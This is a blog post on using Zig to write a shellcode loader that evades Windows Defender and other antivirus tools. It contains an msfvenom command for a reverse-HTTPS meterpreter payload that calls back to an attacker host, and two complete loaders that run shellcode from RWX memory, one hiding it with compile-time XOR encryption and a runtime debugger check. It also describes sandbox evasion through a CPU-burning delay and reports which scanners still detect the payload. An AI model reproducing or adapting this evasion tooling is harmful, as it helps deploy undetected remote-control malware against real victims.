---
layout: post
title: "Bypassing Windows Defender with Zig"
author: "Michal"
---


Zig is a low-level language that aims to become a C-replacement. As I usually did all my offensive security payloads in C, I was pretty interested to try the features of a newer programming language and whether they can replace C as my go-to. In my blogs I will try to showcase features of Zig on few examples of offensive code.

With that said, let's get down to the "Hello world!" of offensive security - a simple shellcode loader. I'm gonna use staged meterpreter, generated with `msfvenom -p windows/x64/meterpreter/reverse_https -o src/meterpreter.bin LHOST=192.168.56.1 LPORT=443`. I chose meterpreter because it's been around for long so all decent AV products should detect its static signatures(how sad I was to found out this is not true), which makes it perfect for our examples. For those new to this, meterpreter is a malware that can remotely control a computer. 

 The loader consists of three phases:
1. Allocate writable and executable memory with `VirtualAlloc`.
2. Copy the shellcode into this memory. 
3. Cast the memory as a function pointer and call it.

Let's get directly to the Zig code:
```zig
const std = @import("std");
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;
const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

pub fn main() !void {
    // We include the compile as a string at compile time
    const shellcode = @embedFile("meterpreter.bin");
    // Allocate RWX memory for the shellcode
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    // We copy the shellcode to the memory.
    @memcpy(allocated_memory_ptr, shellcode);
    // Cast the RWX memory to a function pointer and then call it.
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}
```

The first line of main function uses the `embedFile` builtin. This Zig builtin includes a whole binary file into our code as a string. 
This is a huge difference from C, where you would need to encode meterpreter as a C string:
![meterpreter included as a C file]({{site.url}}/assets/zig01/meterpreter_c.png)

On the next line, we allocate the memory. For WinAPI bindings I use the project [marlersoft/zigwin32](https://github.com/marlersoft/zigwin32) , and it's very simple to call a C function. We need to cast the type to `[*]u8`, which means
a pointer to multiple characters. Zig distinguishes between single element pointers and array pointers, which makes it simple to state your intent.

After that, we copy the shellcode and call a function pointer to it. This is enough for working shellcode loader and we can run meterpreter on a machine with Defender turned off.  However, to my big surprise, the loader still gets undetected by many AV products:
![basic shellcode loader virus total]({{site.url}}/assets/zig01/basic_vt.png)

 Welcome to year 2024 when only 24 AVs are capable of finding embedded meterpreter. I would be really happy to tell you that it's because of some dark optimizations that Zig performed, but to my disappointment the code is straightforward and the whole shellcode is embedded in `.rdata`.

![basic shellcode disassembly]({{site.url}}/assets/zig01/basic_disassembly.png).

### Compile time encryption
The first big problem of our shellcode is that it's a sitting duck for signature detections in the `.rdata` section. To achieve better results and bypass static signatures, we need to decrypt it during runtime. 
Zig offers us the `comptime` keyword, which enables us to run Zig code at compile time. This is similar to C macros or C++ template metaprogramming, but it is easier to read and write. The cool thing about `comptime` is that Zig *must* perform any such operations during compilation time. We can use `comptime` to implement xor encryption of the shellcode.

```zig
const std = @import("std");
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;

const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

//encrypt is a function that takes a compile time known string, and returns it encrypted
fn encrypt(comptime string: []const u8, k: u8) [string.len]u8 {
    // Zig has a default compilation timeout
    // We override it  to a big number so that the whole encryption can happen
    @setEvalBranchQuota(100000000);
    var encrypted_string: [string.len]u8 = undefined;
    // This loops over all characters of string - chr, and idx is the index
    for (string, 0..) |chr, idx| {
        // We do not want to xor with a single value, so we use also the index
        const key: u8 = @truncate((idx * 83) % 256);
        encrypted_string[idx] = chr ^ key ^ k;
    }
    return encrypted_string;
}

// This is very similar to the encrypt function
fn decrypt(mem: []u8, s: []const u8, k: u8) void {
    for (s, 0..) |chr, idx| {
        const key: u8 = @truncate((idx * 83) % 256);
        // The one difference is that this function also calls shouldRun, which should return 0
        // shouldRun is a function that ensures this is evaluated during runtime
        // this is how we prevent Zig from optimizing decryption out
        mem[idx] = chr ^ key ^ k + shouldRun();
    }
}
fn comptimeObfuscation(comptime s: []const u8) [s.len]u8 {
    const key = 0x42;
    // We call encrypt at comptime
    const enc_str = comptime encrypt(s, key);
    var ret_array: [s.len]u8 = [_]u8{0} ** s.len;
    decrypt(&ret_array, &enc_str, key);

    return ret_array;
}

fn shouldRun() u8 {
    // The value of BeingDebugged is determined during runtime
    const peb = std.os.windows.peb();
    return peb.BeingDebugged;
}

pub fn main() !void {
    // We include the shellcode as a string at compile time, and encrypt it
    const shellcode = comptimeObfuscation(@embedFile("meterpreter.bin"));
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    @memcpy(allocated_memory_ptr, shellcode[0..]);
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}
```

Our goal is to invoke the encrypt function during compile time -- Zig's `comptime` keyword enforces this. However, from my experiments, Zig was very eager to also run the decryption at compile time, and thus leaving the shellcode decrypted in the binary. From compiler's point of view this is an obvious optimalization, however we do not want this. The most consistent way to ensure runtime decryption is to make the `decrypt` function depend on any runtime value, 
and I chose the `BeingDebugged` which should be 0 unless program is debugged. The Ghidra decompiler proves that the compiled executable really decrypts the shellcode at runtime:
![disassembly of encrypted shellcode loader]({{site.url}}/assets/zig01/encrypted_disassembly.png)

The results from VirusTotal are not very encouraging. The encryption of shellcode only managed to bypass 5 products, which means we still have a long way to go.
![encrypted shellcode loader virus total]({{site.url}}/assets/zig01/encrypted_vt.png)

## Behavior 
Our encryption is robust and I'm pretty sure that no signatures can be found for our payloads. We can determine which products perform behavior checks by timing them out. To do this, I found a [md5 brute force snippet](https://www.reddit.com/r/adventofcode/comments/szphy0/2015_day_04zig_some_tips_to_solve_the_problem/) online. We will use this snippet to delay decrypting and executing the payload. I will not explain the code, as it's just a simple md5 hash cracking. The point is to use *any* slow computation without relying on functions that can be hooked by AV, such as common sleep functions.

Adding the delay, we can get to only 1 detection, and by AV that I've never actually seen used:
![encrypted shellcode loader with sleep virus total]({{site.url}}/assets/zig01/sleep_vt.png)

Of course, this does not mean that the payload would get executed in a real-world system. The behavior of meterpreter is pretty well known, and Windows defender consistently blocks it once it gets decrypted. Actually, in this case the Windows Defender was very good at detecting the staging mechanism - we could get initial beacon, but the meterpreter was killed immediatly after. I then decided to also play with stageless.

## Stageless meterpreter
While the shellcode of staged meterpreter is very small, it is at the cost of downloading the actual shellcode from the metasploit server. We can also use stageless variant, which comes with the whole meterpreter in the shellcode, thus making it much bigger. This also means more signatures(no encryption and no sleep):
![ stageless loader virus total]({{site.url}}/assets/zig01/stageless_vt.png)

After going through the hoops of encryption and sleep, we get to 8 detections:
![encrypted stageless loader with sleep virus total]({{site.url}}/assets/zig01/stageless_enc_sleep.png)

The reason for these detections is that the `.rdata` section is filled with 200KB of random nonsense and it's easy for any ML algorithm to pick up the entropy anomaly.
![encrypted shellcode loader entropy]({{site.url}}/assets/zig01/encrypted_entropy.png)

The interesting thing is that stageless meterpreter actually bypasses Windows Defender and we get the connection. This means that the detection really was in the staging protocol.

What I wanted to do next is to reduce this entropy - my idea was to simply prepend each encrypted byte with bunch of zeroes. However, this was not possible as Zig's `comptime` eats a *lot* of RAM. Even compiling the previous encryption took around 5 minutes for the stageless meterpreter, indicating that Zig's `comptime` is not yet suitable for very large payloads. This is a known issue with Zig compiler and something that is being worked on.

This basically encompasses my overall feelings of Zig - I like the language, and I think it has big potential for offensive tooling, but it's obvious that the language is still largely in development. Features of this language get added/removed pretty often, and new versions often bring breaking changes. Many codes found on the internet do not work anymore and the code in this blog might not work with the next release of Zig. I'm very hopeful for the future though, especially once the `comptime` memory issues get resolved. I like the language and I plan to write more blogs about it. My next blog will be about using `comptime` for hashing and a custom GetModuleHandle function.

The last thing that I loved about the whole experience was the ease of cross compilation from Linux to Windows. You don't need to involve mingw, the output platform is just a compiler flag for Zig compiler. All code for this blog can be found in my [GitHub](https://github.com/michal-sladecek/zig_experiments). Changes might be necessary to run it.









